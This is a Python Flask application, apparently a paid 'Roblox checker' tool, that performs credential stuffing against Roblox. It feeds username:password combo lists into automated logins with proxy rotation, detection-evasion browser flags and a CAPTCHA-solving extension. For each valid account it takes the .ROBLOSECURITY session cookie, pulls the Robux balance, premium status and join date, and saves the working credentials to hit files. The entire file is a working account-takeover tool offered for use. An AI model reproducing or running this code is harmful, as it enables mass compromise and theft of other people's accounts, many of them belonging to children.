import asyncio
import aiohttp
import json
import os
import tempfile
import shutil
import requests
from pathlib import Path
from flask import Flask, request, jsonify
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from playwright.async_api import async_playwright
from colorama import Fore, init
from threading import Lock
import sys

# Initialize console before using it
console = Console()

# Version Check
CURRENT_VERSION = "1.0.0"
GITHUB_VERSION_URL = "https://raw.githubusercontent.com/xGCrafter/Roblox-Checker---Polygon/main/version.txt"

def check_version():
    console.print("[yellow]Checking version...[/yellow]")
    try:
        response = requests.get(GITHUB_VERSION_URL, timeout=5)
        response.raise_for_status()
        latest_version = response.text.strip()
        console.print(f"[yellow]Current version: {CURRENT_VERSION}, Latest version: {latest_version}[/yellow]")
        if latest_version != CURRENT_VERSION:
            console.print(f"[red]Version mismatch! Please update to version {latest_version}.[/red]")
            sys.exit(1)
        console.print("[green]Version check passed.[/green]")
    except requests.exceptions.RequestException as e:
        console.print(f"[red]Error checking version: {str(e)}[/red]")
        console.print("[red]Version check is mandatory. Exiting...[/red]")
        sys.exit(1)

# Perform version check on startup
check_version()

# Initialize Flask, colorama, and other components
app = Flask(__name__)
init(autoreset=True)
progress_lock = Lock()

# Configuration and global stats
CONFIG = {
    "timeout": 60,
    "retry_delay": 1.0,
    "api_delay": 0.5,
    "proxies": []
}

stats = {
    "hits": 0, "twofa": 0, "bad": 0, "totalrbx": 0,
    "locked": 0, "captcha": 0, "checked": 0, "total": 0
}

# Progress file path
TEMP_DIR = Path(tempfile.gettempdir()) / "Polygon"
TEMP_DIR.mkdir(parents=True, exist_ok=True)
PROGRESS_FILE = TEMP_DIR / "progress.json"

# LicenseGate Validation
def verify_license(license_key: str) -> dict:
    console.print(f"[yellow]Verifying license key: {license_key}[/yellow]")
    try:
        url = "https://api.licensegate.io/license/a1f7c/vmtest1222/verify"
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        data = response.json()
        console.print(f"[yellow]LicenseGate response: {response.status_code} - {data}[/yellow]")
        if data.get('valid', False):
            console.print("[green]License is valid[/green]")
            return {"valid": True, "message": "License is valid"}
        else:
            message = data.get('message', 'Please buy a license key from the discord server!')
            console.print(f"[red]Invalid license key: {message}[/red]")
            return {"valid": False, "message": message}
    except requests.exceptions.RequestException as e:
        console.print(f"[red]Error validating license: {str(e)}[/red]")
        return {"valid": False, "message": f"Error validating license: {str(e)}"}

# Default manifest for NopeCHA
DEFAULT_NOPECHA_MANIFEST = {
    "manifest_version": 3,
    "name": "NopeCHA: CAPTCHA Solver",
    "version": "0.5.5",
    "description": "NopeCHA: CAPTCHA Solver",
    "icons": {
        "16": "icons/icon16.png",
        "48": "icons/icon48.png",
        "128": "icons/icon128.png"
    },
    "background": {
        "service_worker": "background.js"
    },
    "content_scripts": [
        {
            "matches": ["<all_urls>"],
            "js": ["content.js"],
            "run_at": "document_start",
            "all_frames": True
        }
    ],
    "action": {
        "default_icon": {
            "16": "icons/icon16.png",
            "48": "icons/icon48.png",
            "128": "icons/icon128.png"
        },
        "default_popup": "popup.html"
    },
    "permissions": [
        "storage",
        "unlimitedStorage",
        "webRequest",
        "scripting"
    ],
    "host_permissions": ["<all_urls>"],
    "web_accessible_resources": [
        {
            "resources": ["inject.js"],
            "matches": ["<all_urls>"]
        }
    ],
    "nopecha": {
        "key": ""
    }
}

# Utility Functions
def get_script_dir() -> Path:
    return Path(__file__).parent

def get_temp_dir() -> Path:
    return Path(tempfile.gettempdir()) / "Polygon"

def extract_nopecha_to_temp():
    console.print("[yellow]Extracting NopeCHA to temp directory...[/yellow]")
    temp_dir = get_temp_dir() / "nopecha"
    if temp_dir.exists():
        shutil.rmtree(temp_dir, ignore_errors=True)
    shutil.copytree(get_script_dir() / "nopecha", temp_dir)
    console.print("[green]NopeCHA extracted successfully[/green]")

def setup_nopecha_extension(api_key: str, console: Console) -> bool:
    console.print(f"[yellow]Setting up NopeCHA extension with API key: {api_key}[/yellow]")
    nopecha_dir = get_temp_dir() / "nopecha"
    manifest_path = nopecha_dir / "manifest.json"
    if not nopecha_dir.exists():
        console.print("[red]Error: 'nopecha' directory not found.[/red]")
        return False
    if not manifest_path.exists():
        console.print("[red]Error: manifest.json not found.[/red]")
        return False
    try:
        with manifest_path.open("r", encoding="utf-8") as f:
            manifest = json.load(f)
        if "nopecha" not in manifest:
            manifest["nopecha"] = {}
        manifest["nopecha"]["key"] = api_key
        manifest["funcaptcha_auto_solve"] = True
        manifest["funcaptcha_auto_open"] = True
        with manifest_path.open("w", encoding="utf-8") as f:
            json.dump(manifest, f, indent=4)
        console.print("[green]NopeCHA extension setup complete[/green]")
        return True
    except Exception as e:
        console.print(f"[red]Error updating NopeCHA manifest.json: {str(e)}[/red]")
        return False

def get_random_proxy(proxies: list, proxy_index: int) -> str | None:
    if not proxies or proxy_index >= len(proxies):
        return None
    proxy = proxies[proxy_index % len(proxies)]
    console.print(f"[yellow]Selected proxy: {proxy}[/yellow]")
    return proxy

def save_result(output_dir: str, category: str, account: str, account_details: dict = None):
    console.print(f"[yellow]Saving result - Category: {category}, Account: {account}[/yellow]")
    try:
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)
        file_map = {
            "Valid": "hits.txt",
            "Invalid": "bad.txt",
            "2FA": "2fa.txt",
            "Locked": "locked.txt",
            "Captcha": "captcha.txt",
            "Bad": "bad.txt"
        }
        file_name = file_map.get(category, "bad.txt")
        file_path = output_path / file_name
        with file_path.open("a", encoding="utf-8") as f:
            if category == "Valid" and account_details:
                details_str = (
                    f"Account: {account}\n"
                    f"Robux: {account_details.get('robux', 'N/A')}\n"
                    f"Premium Status: {account_details.get('is_premium', 'N/A')}\n"
                    f"Join Date: {account_details.get('join_date', 'N/A')}\n"
                    f"{'-'*50}\n"
                )
                f.write(details_str)
            else:
                f.write(f"[{account}]\n")
        console.print(f"[green]Result saved to {file_path}[/green]")
    except Exception as e:
        console.print(f"[red]Error saving result: {str(e)}[/red]")

async def fetch_account_details_api(session, user_id, roblox_security, console: Console, proxies: list) -> dict:
    console.print(f"[yellow]Fetching account details via API for user_id: {user_id}[/yellow]")
    details = {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
    headers = {
        "Cookie": f".ROBLOSECURITY={roblox_security}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
    }
    proxy_index = 0
    for attempt in range(2):
        proxy = get_random_proxy(proxies, proxy_index)
        try:
            await asyncio.sleep(CONFIG["api_delay"])
            async with session.get(
                f"https://economy.roblox.com/v1/users/{user_id}/currency",
                headers=headers,
                proxy=proxy
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    details["robux"] = data.get("robux", 0)
                    stats["totalrbx"] += details["robux"]
                    console.print(f"[green]Fetched Robux: {details['robux']}[/green]")
                    break
                elif response.status == 429:
                    proxy_index += 1
                    await asyncio.sleep(CONFIG["retry_delay"])
                    console.print("[yellow]Rate limit hit, retrying...[/yellow]")
                elif response.status in (401, 403):
                    console.print("[red]Unauthorized access, stopping API fetch[/red]")
                    return None
                else:
                    proxy_index += 1
                    console.print(f"[red]Unexpected status: {response.status}[/red]")
                    break
        except Exception as e:
            proxy_index += 1
            console.print(f"[red]Error in API fetch: {str(e)}[/red]")
            break
    for attempt in range(2):
        proxy = get_random_proxy(proxies, proxy_index)
        try:
            await asyncio.sleep(CONFIG["api_delay"])
            async with session.get(
                f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
                headers=headers,
                proxy=proxy
            ) as response:
                if response.status == 200:
                    details["is_premium"] = "Yes" if (await response.json()).get("isPremium", False) else "No"
                    console.print(f"[green]Fetched Premium Status: {details['is_premium']}[/green]")
                    break
                elif response.status == 429:
                    proxy_index += 1
                    await asyncio.sleep(CONFIG["retry_delay"])
                    console.print("[yellow]Rate limit hit, retrying...[/yellow]")
                elif response.status in (401, 403):
                    console.print("[red]Unauthorized access, stopping API fetch[/red]")
                    return None
                else:
                    proxy_index += 1
                    console.print(f"[red]Unexpected status: {response.status}[/red]")
                    break
        except Exception as e:
            proxy_index += 1
            console.print(f"[red]Error in API fetch: {str(e)}[/red]")
            break
    for attempt in range(2):
        proxy = get_random_proxy(proxies, proxy_index)
        try:
            await asyncio.sleep(CONFIG["api_delay"])
            async with session.get(
                f"https://users.roblox.com/v1/users/{user_id}",
                headers=headers,
                proxy=proxy
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    details["join_date"] = data.get("created", "N/A")
                    console.print(f"[green]Fetched Join Date: {details['join_date']}[/green]")
                    break
                elif response.status == 429:
                    proxy_index += 1
                    await asyncio.sleep(CONFIG["retry_delay"])
                    console.print("[yellow]Rate limit hit, retrying...[/yellow]")
                elif response.status in (401, 403):
                    console.print("[red]Unauthorized access, stopping API fetch[/red]")
                    return None
                else:
                    proxy_index += 1
                    console.print(f"[red]Unexpected status: {response.status}[/red]")
                    break
        except Exception as e:
            proxy_index += 1
            console.print(f"[red]Error in API fetch: {str(e)}[/red]")
            break
    return details

async def fetch_account_details_scrape(page, user_id, console: Console) -> dict:
    console.print(f"[yellow]Scraping account details for user_id: {user_id}[/yellow]")
    details = {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
    try:
        await page.goto(f"https://www.roblox.com/users/{user_id}/profile", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
        console.print("[yellow]Navigated to profile page[/yellow]")
        await page.goto("https://www.roblox.com/home", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
        console.print("[yellow]Navigated to home page[/yellow]")
        try:
            robux_text = await page.locator("span#navbar-robux-balance").text_content(timeout=3000)
            robux = int(''.join(filter(str.isdigit, robux_text))) if robux_text else 0
            details["robux"] = robux
            stats["totalrbx"] += robux
            console.print(f"[green]Scraped Robux: {robux}[/green]")
        except Exception as e:
            console.print(f"[red]Error scraping Robux: {str(e)}[/red]")
        await page.goto(f"https://www.roblox.com/users/{user_id}/profile", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
        console.print("[yellow]Navigated back to profile page[/yellow]")
        try:
            premium_badge = await page.locator("span.icon-premium").count()
            details["is_premium"] = "Yes" if premium_badge > 0 else "No"
            console.print(f"[green]Scraped Premium Status: {details['is_premium']}[/green]")
        except Exception as e:
            console.print(f"[red]Error scraping Premium Status: {str(e)}[/red]")
        try:
            join_date_text = None
            selectors = [
                "span.profile-join-date",
                "div.profile-header-content >> span",
                "p.profile-about-content-text",
                "div.profile-statistics >> span"
            ]
            for selector in selectors:
                try:
                    join_date_text = await page.locator(selector).text_content(timeout=3000)
                    if join_date_text and ("joined" in join_date_text.lower() or any(month in join_date_text.lower() for month in ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"])):
                        break
                except Exception:
                    continue
            details["join_date"] = join_date_text.strip() if join_date_text else "N/A"
            console.print(f"[green]Scraped Join Date: {details['join_date']}[/green]")
        except Exception as e:
            console.print(f"[red]Error scraping Join Date: {str(e)}[/red]")
    except Exception as e:
        console.print(f"[red]Error during scraping: {str(e)}[/red]")
    return details

async def fetch_account_details(page, cookies, console: Console, proxies: list) -> dict:
    console.print("[yellow]Fetching account details...[/yellow]")
    try:
        roblox_security = next((c["value"] for c in cookies if c["name"] == ".ROBLOSECURITY"), None)
        if not roblox_security:
            console.print("[red]No ROBLOSECURITY cookie found[/red]")
            return {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
        user_id = None
        try:
            # Use raw string for regex to avoid escape sequence warning
            user_id_script = await page.evaluate(r'() => document.body.innerHTML.match(/data-userid="(\d+)"/)?.[1]')
            user_id = user_id_script if user_id_script else None
            console.print(f"[yellow]Extracted user_id: {user_id}[/yellow]")
        except Exception as e:
            console.print(f"[red]Error extracting user_id: {str(e)}[/red]")
        if not user_id:
            console.print("[red]No user_id found[/red]")
            return {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
        if roblox_security:
            async with aiohttp.ClientSession() as session:
                api_details = await fetch_account_details_api(session, user_id, roblox_security, console, proxies)
                if api_details is not None:
                    console.print("[green]Account details fetched via API[/green]")
                    return api_details
        console.print("[yellow]Falling back to scraping...[/yellow]")
        return await fetch_account_details_scrape(page, user_id, console)
    except Exception as e:
        console.print(f"[red]Error fetching account details: {str(e)}[/red]")
        return {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}

async def login_worker(queue, context, semaphore, output_dir, proxies, max_proxies_per_account, console, use_captcha_solver, proxy_index, pages, results):
    async with semaphore:
        while True:
            try:
                combo = await queue.get()
                username, password = combo.split(":", 1)
                console.print(f"[yellow]Checking account: {username}[/yellow]")
                proxy = get_random_proxy(proxies, proxy_index) if max_proxies_per_account > 0 else None
                page = await context.new_page()
                pages.append(page)
                console.print(f"[yellow]Created new page for {username}[/yellow]")
                if proxy:
                    try:
                        await page.route("**", lambda route: route.continue_(proxy=proxy))
                        console.print(f"[yellow]Applied proxy to page: {proxy}[/yellow]")
                    except Exception as e:
                        console.print(f"[red]Error applying proxy: {str(e)}[/red]")
                try:
                    # Navigate to login page
                    await page.goto("https://www.roblox.com/login", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
                    console.print(f"[yellow]Navigated to login page for {username}[/yellow]")
                    
                    # Fill in login form
                    await page.fill("input#login-username", username)
                    await page.fill("input#login-password", password)
                    await page.click("button#login-button")
                    console.print(f"[yellow]Submitted login form for {username}[/yellow]")
                    
                    # Wait for navigation or error
                    await page.wait_for_load_state("networkidle", timeout=CONFIG["timeout"] * 1000)
                    
                    # Check login status
                    if "home" in page.url.lower():
                        console.print(f"[green]Login successful for {username}[/green]")
                        stats["hits"] += 1
                        cookies = await context.cookies()
                        details = await fetch_account_details(page, cookies, console, proxies)
                        save_result(output_dir, "Valid", f"{username}:{password}", details)
                        results.append({"account": f"{username}:{password}", "status": "Valid", "details": details})
                    elif "challenge" in page.url.lower() or await page.locator("div#challenge").count() > 0:
                        console.print(f"[yellow]2FA required for {username}[/yellow]")
                        stats["twofa"] += 1
                        save_result(output_dir, "2FA", f"{username}:{password}")
                        results.append({"account": f"{username}:{password}", "status": "2FA"})
                    elif "locked" in page.url.lower() or await page.locator("div#locked").count() > 0:
                        console.print(f"[red]Account locked: {username}[/red]")
                        stats["locked"] += 1
                        save_result(output_dir, "Locked", f"{username}:{password}")
                        results.append({"account": f"{username}:{password}", "status": "Locked"})
                    elif "captcha" in page.url.lower() or await page.locator("div#captcha").count() > 0:
                        console.print(f"[red]Captcha encountered for {username}[/red]")
                        stats["captcha"] += 1
                        save_result(output_dir, "Captcha", f"{username}:{password}")
                        results.append({"account": f"{username}:{password}", "status": "Captcha"})
                    else:
                        console.print(f"[red]Invalid credentials for {username}[/red]")
                        stats["bad"] += 1
                        save_result(output_dir, "Bad", f"{username}:{password}")
                        results.append({"account": f"{username}:{password}", "status": "Bad"})
                except Exception as e:
                    console.print(f"[red]Error during login for {username}: {str(e)}[/red]")
                    stats["bad"] += 1
                    save_result(output_dir, "Bad", f"{username}:{password}")
                    results.append({"account": f"{username}:{password}", "status": "Bad"})
                finally:
                    stats["checked"] += 1
                    with open(PROGRESS_FILE, "w") as f:
                        json.dump(stats, f)
                    await page.close()
                    pages.remove(page)
                queue.task_done()
            except asyncio.QueueEmpty:
                break

@app.route("/web/validate", methods=["GET"])
def validate():
    license_key = request.args.get("key", "")
    return jsonify(verify_license(license_key))

@app.route("/web/check_accounts", methods=["POST"])
async def check_accounts():
    global stats
    data = request.get_json()
    combos = data.get("combos", [])
    proxies = data.get("proxies", [])
    use_proxies = data.get("use_proxies", False)
    use_captcha_solver = data.get("use_captcha_solver", False)
    nopecha_api_key = data.get("nopecha_api_key", "")
    max_tasks = data.get("max_tasks", 1)
    headless_mode = data.get("headless_mode", True)

    stats = {
        "hits": 0, "twofa": 0, "bad": 0, "totalrbx": 0,
        "locked": 0, "captcha": 0, "checked": 0, "total": len(combos)
    }
    with open(PROGRESS_FILE, "w") as f:
        json.dump(stats, f)

    output_dir = os.path.join(get_temp_dir(), "output")
    if os.path.exists(output_dir):
        shutil.rmtree(output_dir, ignore_errors=True)

    results = []
    pages = []
    queue = asyncio.Queue()
    for combo in combos:
        await queue.put(combo)

    async with async_playwright() as p:
        browser_args = [
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-infobars",
            "--disable-dev-shm-usage",
            "--disable-gpu",
        ]
        browser_kwargs = {
            "headless": headless_mode,
            "args": browser_args,
        }
        if use_captcha_solver and nopecha_api_key:
            extract_nopecha_to_temp()
            if setup_nopecha_extension(nopecha_api_key, console):
                browser_kwargs["chromium_sandbox"] = False
                browser_kwargs["args"].append(f"--load-extension={get_temp_dir() / 'nopecha'}")
                browser_kwargs["args"].append("--disable-extensions-except=" + str(get_temp_dir() / "nopecha"))

        browser = await p.chromium.launch(**browser_kwargs)
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            viewport={"width": 1280, "height": 720}
        )

        semaphore = asyncio.Semaphore(max_tasks)
        tasks = []
        proxy_index = 0
        for _ in range(max_tasks):
            task = asyncio.create_task(login_worker(queue, context, semaphore, output_dir, proxies, 1 if use_proxies else 0, console, use_captcha_solver, proxy_index, pages, results))
            tasks.append(task)
            proxy_index += 1

        await queue.join()
        for task in tasks:
            task.cancel()

        for page in pages:
            await page.close()
        await context.close()
        await browser.close()

    return jsonify({"stats": stats, "results": results, "output_dir": output_dir})

if __name__ == "__main__":
    # Use environment variables for host and port to support web hosting
    host = os.getenv("HOST", "0.0.0.0")
    port = int(os.getenv("PORT", 5500))
    app.run(host=host, port=port, debug=False)